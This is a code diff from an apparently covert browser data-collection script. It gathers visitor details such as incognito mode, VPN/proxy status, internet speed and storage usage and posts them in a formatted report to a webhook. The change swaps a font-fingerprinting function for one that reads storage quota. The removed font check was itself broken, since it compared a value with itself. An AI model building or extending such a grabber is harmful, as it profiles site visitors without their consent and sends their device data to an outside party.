@@ -195,18 +195,12 @@ function detectIncognito() {
     });
 }
 
-async function getInstalledFonts() {
-    let fonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia"];
-    let installedFonts = [];
-    let ctx = document.createElement("canvas").getContext("2d");
-    ctx.font = "72px sans-serif";
-    for (let font of fonts) {
-        ctx.font = `72px ${font}, sans-serif`;
-        if (ctx.measureText("ABC").width !== ctx.measureText("ABC").width) {
-            installedFonts.push(font);
-        }
+async function getStorageInfo() {
+    if (navigator.storage && navigator.storage.estimate) {
+        let estimate = await navigator.storage.estimate();
+        return `Total: ${(estimate.quota / (1024*1024*1024)).toFixed(2)} GB, Used: ${(estimate.usage / (1024*1024*1024)).toFixed(2)} GB`;
     }
-    return installedFonts.length > 0 ? installedFonts.join(", ") : "Unknown";
+    return "Unknown";
 }
 
 async function sendToWebhook() {
@@ -253,7 +247,7 @@ async function sendToWebhook() {
                          `🚀 **Internet Speed:** ${internetSpeed}\n` +
                          `🛡️ **VPN/Proxy:** ${vpnStatus}\n` +
                          `🔒 **Incognito Mode:** ${incognitoMode}\n` +
-                         `🖋️ **Installed Fonts:** ${installedFonts}\n\n` +
+                         `💾 **Storage Info:** ${deviceInfo.storage}\n` +
                          `🕒 **Time:** ${dateTime}`
             };
 
